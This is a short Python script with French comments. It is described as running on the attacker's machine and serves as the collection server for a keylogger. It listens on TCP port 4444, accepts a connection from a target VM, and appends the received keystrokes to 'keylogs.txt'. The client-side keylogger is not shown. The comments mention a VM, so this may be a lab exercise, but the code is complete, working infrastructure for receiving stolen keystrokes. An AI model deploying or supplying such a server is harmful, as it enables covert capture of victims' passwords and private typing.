# server.py
# À exécuter sur la machine de l'attaquant

import socket

# --- Configuration du serveur ---
# Laissez l'IP vide pour écouter sur toutes les interfaces réseau disponibles.
# Cela simplifie la connexion depuis la VM cible.
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444 # Port d'écoute, vous pouvez le changer.

# Taille du buffer pour recevoir les données (en octets)
BUFFER_SIZE = 1024

# --- Création du socket ---
# AF_INET spécifie l'utilisation d'adresses IPv4.
# SOCK_STREAM spécifie que c'est un socket TCP (fiable et orienté connexion).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Lie le socket à l'adresse et au port spécifiés.
    s.bind((SERVER_HOST, SERVER_PORT))

    # Met le serveur en mode écoute, avec une seule connexion en attente autorisée.
    s.listen(1)
    print(f"[*] Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}")

    # Accepte la connexion du client.
    # Cette ligne est bloquante : le script attendra ici qu'un client se connecte.
    client_socket, client_address = s.accept()
    print(f"[+] Connexion acceptée de {client_address[0]}:{client_address[1]}")

    # Ouvre un fichier pour enregistrer les logs. 'a' pour 'append' (ajouter à la fin).
    with open("keylogs.txt", "a") as f:
        while True:
            # Reçoit les données envoyées par le client.
            # Cette ligne est également bloquante.
            data = client_socket.recv(BUFFER_SIZE).decode()

            # Si aucune donnée n'est reçue, la connexion a été fermée par le client.
            if not data:
                break

            # Écrit les données reçues dans le fichier et l'affiche à l'écran.
            f.write(data)
            print(data, end="")

except Exception as e:
    print(f"[!] Erreur : {e}")

finally:
    # Ferme les sockets pour libérer les ressources.
    if 'client_socket' in locals():
        client_socket.close()
    s.close()
    print("\n[!] Serveur arrêté.")
